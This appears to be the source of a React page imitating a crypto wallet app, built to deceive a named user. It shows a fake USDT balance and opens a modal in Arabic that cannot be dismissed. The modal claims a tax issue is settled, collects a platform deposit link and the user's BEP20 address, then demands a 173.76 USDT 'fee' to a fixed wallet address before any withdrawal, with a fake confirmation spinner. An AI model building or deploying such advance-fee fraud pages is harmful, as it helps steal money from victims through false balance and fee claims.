
import React, { useState, useEffect } from 'react';
import { 
  HomeIcon, 
  ServiceIcon, 
  MenuIcon, 
  RecordIcon, 
  MineIcon,
  ChatIcon,
  WalletActionIcon,
  CardActionIcon,
  TeamIcon,
  RecordFeatureIcon,
  WalletManagementIcon,
  InviteIcon,
  ProfileIcon,
  ChevronRightIcon,
  CustomAvatarIcon
} from './components/Icons.tsx';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Mine');
  const [modalStep, setModalStep] = useState<number | null>(1);
  const [miniProLink, setMiniProLink] = useState('');
  const [bep20Address, setBep20Address] = useState('');

  // Prevent scroll when modal is open
  useEffect(() => {
    if (modalStep !== null) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [modalStep]);

  const nextStep = () => {
    if (modalStep !== null) {
      setModalStep(modalStep + 1);
    }
  };

  const renderModalContent = () => {
    switch(modalStep) {
      case 1:
        return (
          <div className="flex flex-col items-center text-center gap-4">
            <h2 className="text-xl font-bold text-[#9B4A4E]">أهلاً بك huzefa</h2>
            <p className="text-[14px] leading-relaxed text-gray-700">
              تم حل أمر الضريبه يمكن سحب جميع العملات يرجى عدم مشاركه الرابط الخاص بحسابك نحن غير مسؤولين عن فقدان العملات ان تم تسريبه.
              <br/><br/>
              الآن اضغط التالي وقم بوضع رابط المنصة <span className="font-bold">mini pro</span> لقسم الايداع حصراً.
            </p>
            <button 
              onClick={nextStep}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold mt-2 active:scale-95 transition-transform"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="flex flex-col items-center text-center gap-4">
            <h2 className="text-lg font-bold">رابط منصة mini pro</h2>
            <p className="text-[13px] text-gray-600">يرجى وضع رابط قسم الإيداع في منصة mini pro حصراً</p>
            <input 
              type="text" 
              dir="ltr"
              placeholder="https://..."
              value={miniProLink}
              onChange={(e) => setMiniProLink(e.target.value)}
              className="w-full border-2 border-gray-100 rounded-xl px-4 py-3 outline-none focus:border-[#9B4A4E] transition-colors text-sm"
            />
            <button 
              onClick={nextStep}
              disabled={!miniProLink}
              className={`w-full py-3 rounded-xl font-bold mt-2 active:scale-95 transition-transform ${miniProLink ? 'bg-[#9B4A4E] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="flex flex-col items-center text-center gap-4">
            <h2 className="text-lg font-bold">رابط محفظة BEP 20</h2>
            <p className="text-[13px] text-gray-600">يرجى إدخال عنوان محفظة BEP 20 الخاصة بك لاستلام العملات</p>
            <input 
              type="text" 
              dir="ltr"
              placeholder="0x..."
              value={bep20Address}
              onChange={(e) => setBep20Address(e.target.value)}
              className="w-full border-2 border-gray-100 rounded-xl px-4 py-3 outline-none focus:border-[#9B4A4E] transition-colors text-sm"
            />
            <button 
              onClick={nextStep}
              disabled={!bep20Address}
              className={`w-full py-3 rounded-xl font-bold mt-2 active:scale-95 transition-transform ${bep20Address ? 'bg-[#9B4A4E] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}
            >
              التالي
            </button>
          </div>
        );
      case 4:
        return (
          <div className="flex flex-col items-center text-center gap-4 max-h-[70vh] overflow-y-auto px-1">
            <h2 className="text-lg font-bold text-[#9B4A4E]">أهلاً بك huzefa</h2>
            <p className="text-[13px] leading-relaxed text-gray-700 text-right">
              بقي أمر إيداع مبلغ <span className="font-bold text-red-600">173.76</span> عملة USDT BEP 20 لفتح قناة السحب.
              <br/><br/>
              هذه الضريبه هي أجور منصتنا وليس لها أي صله بمنصه mini pro، وتم تخفيض الضريبة بتسويه من منصة mini pro بموجب اتفاق ضمن برتكول الخاص بالمنصه الاساسيه.
            </p>
            <div className="w-full bg-gray-50 p-3 rounded-xl border border-dashed border-gray-300">
              <p className="text-[11px] text-gray-400 mb-1">حول المبلغ إلى هذا العنوان:</p>
              <p className="text-[12px] font-mono break-all font-bold text-[#9B4A4E]">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
              <button 
                onClick={() => navigator.clipboard.writeText('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')}
                className="text-[11px] mt-2 text-[#9B4A4E] underline font-bold"
              >
                نسخ العنوان
              </button>
            </div>
            <button 
              onClick={nextStep}
              className="w-full bg-[#9B4A4E] text-white py-3 rounded-xl font-bold mt-2 active:scale-95 transition-transform"
            >
              تم الايداع
            </button>
          </div>
        );
      case 5:
        return (
          <div className="flex flex-col items-center text-center gap-5">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-[#9B4A4E] rounded-full animate-spin"></div>
            <h2 className="text-lg font-bold">الرجاء الانتظار</h2>
            <p className="text-[13px] leading-relaxed text-gray-600">
              الرجاء الانتظار للتأكد من عملية الايداع. سيتم توجهيك للخطوة النهائيه بعد تأكيد الايداع لوضع كلمة المرور وستكون اخر خطوة تفصل عن السحب.
            </p>
            <div className="w-full bg-blue-50 text-blue-700 text-[12px] p-3 rounded-lg border border-blue-100">
              العملية قد تستغرق من 5 إلى 15 دقيقة
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className={`flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#ffffff] relative pb-20 overflow-x-hidden ${modalStep !== null ? 'overflow-hidden' : ''}`}>
      
      {/* Modal Overlay */}
      {modalStep !== null && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6">
          <div className="absolute inset-0 bg-black/20 backdrop-blur-[1px]" onClick={() => {}}></div>
          <div className="bg-white w-full max-w-[340px] rounded-[24px] shadow-2xl z-[110] p-6 relative animate-in zoom-in-95 duration-200" dir="rtl">
            {renderModalContent()}
          </div>
        </div>
      )}

      {/* Main Content */}
      <div className={`${modalStep !== null ? 'blur-[0.5px] select-none pointer-events-none' : ''}`}>
        {/* Header Section */}
        <div 
          className="w-full pt-8 pb-4 px-5 text-white"
          style={{ background: 'linear-gradient(to right, #9B4A4E, #7C4A50)' }}
        >
          <div className="flex justify-between items-start">
            <div className="flex items-center gap-3">
              {/* Avatar */}
              <div className="w-16 h-16 rounded-full border-2 border-white/20 overflow-hidden bg-white flex items-center justify-center">
                <CustomAvatarIcon size={64} />
              </div>
              
              <div className="flex flex-col">
                <div className="flex items-center gap-2">
                  <span className="text-[18px] font-bold tracking-tight uppercase">huzefa</span>
                  <span className="bg-[#F5B400] text-white text-[10px] px-1.5 py-0.5 rounded-[4px] font-bold italic leading-none">VIP 0</span>
                </div>
                <span className="text-[13px] opacity-90 mt-1">Invitation code: 804461</span>
              </div>
            </div>
            
            <button className="mt-2 opacity-90 hover:opacity-100 transition-opacity">
              <ChatIcon size={24} />
            </button>
          </div>

          {/* My Account Section */}
          <div className="mt-6 flex justify-between items-end">
            <div className="flex flex-col pb-1">
              <span className="text-[14px] font-medium opacity-90">My Account</span>
              <div className="mt-1 flex items-baseline gap-1">
                <span className="text-[12px] opacity-80 font-medium">USDT</span>
                <span className="text-[22px] font-bold leading-none">1522.4586</span>
              </div>
            </div>

            <div className="flex gap-4">
              <div className="flex flex-col items-center gap-2">
                <button className="w-[54px] h-[54px] bg-[#F5F5F5] rounded-[20px] flex items-center justify-center shadow-sm">
                  <WalletActionIcon size={30} />
                </button>
                <span className="text-[11px] font-medium opacity-90">Deposit</span>
              </div>
              <div className="flex flex-col items-center gap-2">
                <button className="w-[54px] h-[54px] bg-[#F5F5F5] rounded-[20px] flex items-center justify-center shadow-sm">
                  <CardActionIcon size={30} />
                </button>
                <span className="text-[11px] font-medium opacity-90">Withdrawal</span>
              </div>
            </div>
          </div>
        </div>

        {/* Feature Icons Grid */}
        <div className="grid grid-cols-4 gap-2 py-6 px-2 bg-white border-b border-gray-50">
          <FeatureItem icon={<TeamIcon />} label="Teams" />
          <FeatureItem icon={<RecordFeatureIcon />} label="Record" />
          <FeatureItem icon={<WalletManagementIcon />} label="Wallet management" />
          <FeatureItem icon={<InviteIcon />} label="Invite friends" />
        </div>

        <div className="h-2 bg-[#f4f5f7]"></div>

        {/* Menu List Section */}
        <div className="px-4 py-2">
          <div className="bg-white rounded-[16px]">
            <MenuItem 
              icon={<ProfileIcon color="#8e96a4" />} 
              label="Profile" 
            />
            <MenuItem 
              icon={<RecordFeatureIcon color="#8e96a4" size={20} />} 
              label="Deposit records" 
            />
            <MenuItem 
              icon={<RecordFeatureIcon color="#8e96a4" size={20} flip />} 
              label="Withdrawal records" 
            />
            <MenuItem 
              icon={<MineIcon color="#8e96a4" size={20} strokeWidth={2.5} />} 
              label="Setting" 
              hideBorder 
            />
          </div>
        </div>
      </div>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[430px] h-[64px] bg-white border-t border-gray-100 flex items-center justify-around z-50 px-2 shadow-[0_-2px_10px_rgba(0,0,0,0.03)]">
        <NavItem 
          icon={<HomeIcon active={activeTab === 'Home'} />} 
          label="Home" 
          active={activeTab === 'Home'}
          onClick={() => setActiveTab('Home')}
        />
        <NavItem 
          icon={<ServiceIcon active={activeTab === 'Service'} />} 
          label="Service" 
          active={activeTab === 'Service'}
          onClick={() => setActiveTab('Service')}
        />
        <NavItem 
          icon={<MenuIcon active={activeTab === 'Menu'} />} 
          label="Menu" 
          active={activeTab === 'Menu'}
          onClick={() => setActiveTab('Menu')}
        />
        <NavItem 
          icon={<RecordIcon active={activeTab === 'Record'} />} 
          label="Record" 
          active={activeTab === 'Record'}
          onClick={() => setActiveTab('Record')}
        />
        <NavItem 
          icon={<MineIcon active={activeTab === 'Mine'} />} 
          label="Mine" 
          active={activeTab === 'Mine'}
          onClick={() => setActiveTab('Mine')}
        />
      </nav>
    </div>
  );
};

interface FeatureItemProps {
  icon: React.ReactNode;
  label: string;
}

const FeatureItem: React.FC<FeatureItemProps> = ({ icon, label }) => (
  <button className="flex flex-col items-center gap-2 group">
    <div className="w-10 h-10 flex items-center justify-center transition-transform group-active:scale-95">
      {icon}
    </div>
    <span className="text-[11px] text-[#333333] font-medium leading-tight text-center px-1">{label}</span>
  </button>
);

interface MenuItemProps {
  icon: React.ReactNode;
  label: string;
  hideBorder?: boolean;
}

const MenuItem: React.FC<MenuItemProps> = ({ icon, label, hideBorder }) => (
  <button className={`w-full flex items-center justify-between py-4 group active:bg-gray-50 transition-colors ${!hideBorder ? 'border-b border-gray-50' : ''}`}>
    <div className="flex items-center gap-3">
      <div className="w-6 h-6 flex items-center justify-center">
        {icon}
      </div>
      <span className="text-[14px] text-[#333333] font-medium">{label}</span>
    </div>
    <ChevronRightIcon />
  </button>
);

interface NavItemProps {
  icon: React.ReactNode;
  label: string;
  active: boolean;
  onClick: () => void;
}

const NavItem: React.FC<NavItemProps> = ({ icon, label, active, onClick }) => (
  <button 
    onClick={onClick}
    className="flex flex-col items-center justify-center gap-1 w-full h-full"
  >
    <div className={`transition-all duration-200 ${active ? 'scale-110' : ''}`}>
      {icon}
    </div>
    <span className={`text-[11px] font-medium ${active ? 'text-[#333333]' : 'text-[#8e96a4]'}`}>{label}</span>
  </button>
);

export default App;
